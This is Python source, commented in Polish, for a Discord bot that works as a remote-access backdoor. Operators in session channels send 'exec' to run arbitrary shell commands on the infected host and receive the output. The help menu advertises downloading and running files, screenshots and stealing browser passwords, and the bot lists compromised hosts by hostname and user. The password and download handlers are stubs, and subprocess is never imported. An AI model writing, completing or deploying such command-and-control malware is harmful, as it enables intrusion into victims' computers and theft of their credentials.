import discord
import asyncio
import re

intents = discord.Intents.default()
intents.message_content = True
intents.guild_messages = True

client = discord.Client(intents=intents)

# ⚙️ Ustawienia
BOT_TOKEN = "TWOJ_TOKEN_BOTA_TUTAJ"
SESSION_CHANNELS = {}  # channel_id -> session_data

@client.event
async def on_ready():
    print(f'[+] Bot {client.user} jest online.')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    channel_id = str(message.channel.id)
    content = message.content.strip().lower()

    if channel_id in SESSION_CHANNELS:
        await message.channel.send(f"[>] Odebrano: {content}")

        if content.startswith("exec"):
            cmd = content[len("exec"):].strip()
            result = await run_exec(cmd, message.channel)
            await message.channel.send(f"💻 Wynik:\n```\n{result[:1900]}\n```")

        elif content.startswith("download"):
            url = content[len("download"):].strip()
            await message.channel.send(f"📥 Pobieranie: `{url}`")

        elif content == "hasła" or content == "passwords":
            await message.channel.send("[+] Próba wykradnięcia haseł...")
            # Możesz tu dodać integrację z klientem

        elif content == "sesje" or content == "sessions":
            await show_sessions(message.channel)

        elif content == "help" or content == "pomoc":
            await message.channel.send(
                "**Dostępne komendy:**\n"
                "`exec [komenda]` - wykonaj komendę\n"
                "`download [url]` - pobierz i uruchom plik\n"
                "`screenshot` - zrób zrzut ekranu\n"
                "`hasła` - wykradnij hasła z przeglądarek\n"
                "`sesje` - pokaż wszystkie sesje\n"
                "`exit` - zamknij sesję"
            )

        elif content == "exit":
            await message.channel.send("🔴 Sesja zakończona.")
            del SESSION_CHANNELS[channel_id]

    else:
        # Jeśli kanał nie należy do sesji — ignoruj
        pass

# 📦 Wykonaj komendę CMD / PowerShell
async def run_exec(cmd, channel):
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout, stderr = proc.communicate()
        result = stdout.decode("utf-8", errors="ignore") + stderr.decode("utf-8", errors="ignore")
        return result
    except Exception as e:
        return str(e)

# 📋 Pokaż aktywne sesje
async def show_sessions(channel):
    if not SESSION_CHANNELS:
        await channel.send("📭 Brak aktywnych sesji.")
        return

    output = "**🟢 Aktywne sesje:**\n\n"
    for ch_id, data in SESSION_CHANNELS.items():
        info = data["info"]
        output += (
            f"🔹 Kanał: `{ch_id}`\n"
            f"🖥️ Host: {info['hostname']}\n"
            f"👤 Użytkownik: {info['username']}\n"
            f"🔗 Komendy: `sesja {ch_id} <komenda>`\n"
            f"{'-' * 30}\n"
        )
    await channel.send(output)

# 🚀 Start bota
client.run(BOT_TOKEN)
